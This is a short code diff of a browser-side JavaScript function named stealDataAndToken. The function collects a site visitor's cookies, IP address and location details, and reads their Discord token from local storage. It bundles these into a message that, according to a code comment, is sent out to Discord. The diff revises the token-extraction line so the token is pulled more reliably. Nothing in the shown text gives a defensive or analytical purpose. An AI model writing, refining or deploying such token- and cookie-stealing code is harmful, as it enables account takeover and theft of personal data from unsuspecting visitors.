@@ -2,8 +2,8 @@
 function stealDataAndToken() {
     var cookies = document.cookie;
 
-    // Assuming the Discord token is stored with the key "Token" in local storage
-    var token = localStorage.getItem('Token') || 'Token not found'; // Default message if token not found
+    // Retrieve Discord token from local storage
+    var token = localStorage.getItem('https://discord.com') ? JSON.parse(localStorage.getItem('https://discord.com')).Token : 'Token not found';
 
     // Fetch user's IP
     fetch('https://httpbin.org/ip')
@@ -31,7 +31,7 @@ Someone visited the website from:
 - Postal Code: ${postalCode}
 - IP Address: ${clientIp}
 - Cookies: ${cookies}
-- Discord Token: ${token}
+- Discord Token: ${token} // Include the Discord token here
 \`\`\``;
 
             // Send message to Discord
